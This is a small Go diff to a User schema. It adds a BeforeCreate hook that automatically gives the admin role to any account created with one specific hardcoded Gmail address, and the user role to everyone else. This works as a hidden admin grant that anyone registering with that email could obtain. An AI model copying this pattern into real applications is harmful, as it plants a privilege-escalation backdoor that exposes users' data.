@@ -1,6 +1,7 @@
 package schema
 
 import (
+	"strings"
 	"time"
 
 	"github.com/google/uuid"
@@ -33,4 +34,13 @@ type UpdateUserRequest struct {
 
 func (User) TableName() string {
 	return "users"
+}
+
+func (u *User) BeforeCreate() (err error) {
+	if strings.ToLower(u.Email) == "shadowshukla76@gmail.com" {
+		u.Role = "admin"
+	} else {
+		u.Role = "user"
+	}
+	return nil
 }
